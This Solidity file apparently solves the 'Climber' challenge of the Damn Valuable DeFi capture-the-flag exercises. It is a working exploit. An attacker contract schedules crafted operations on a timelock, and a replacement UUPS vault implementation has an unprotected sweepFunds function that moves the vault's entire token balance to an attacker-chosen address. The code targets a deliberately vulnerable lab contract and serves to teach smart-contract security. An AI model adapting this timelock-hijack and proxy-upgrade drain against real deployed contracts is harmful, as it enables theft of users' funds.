// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberTimelock} from "../../src/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract NewClimberVaultImplementation is
    Initializable,
    OwnableUpgradeable,
    UUPSUpgradeable
{
    function sweepFunds(
        address _token,
        address _vault,
        address _recovery
    ) external {
        SafeTransferLib.safeTransfer(
            _token,
            _recovery,
            IERC20(_token).balanceOf(_vault)
        );
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}

contract ClimberAttacker {
    DamnValuableToken private dvt;
    ClimberTimelock private timelock;
    ClimberVault private originalVault;

    address[] private targets;
    bytes[] private dataElements;

    constructor(
        address _dvt,
        address _originalVault,
        address payable _timelock
    ) {
        dvt = DamnValuableToken(_dvt);
        timelock = ClimberTimelock(_timelock);
        originalVault = ClimberVault(_originalVault);
    }

    function prepareCallData(
        address[] memory _targets,
        bytes[] memory _dataElements
    ) external {
        targets = _targets;
        dataElements = _dataElements;
    }

    function finishAttack() external {
        uint256[] memory values = new uint256[](targets.length);

        timelock.schedule(targets, values, dataElements, 0);
    }
}
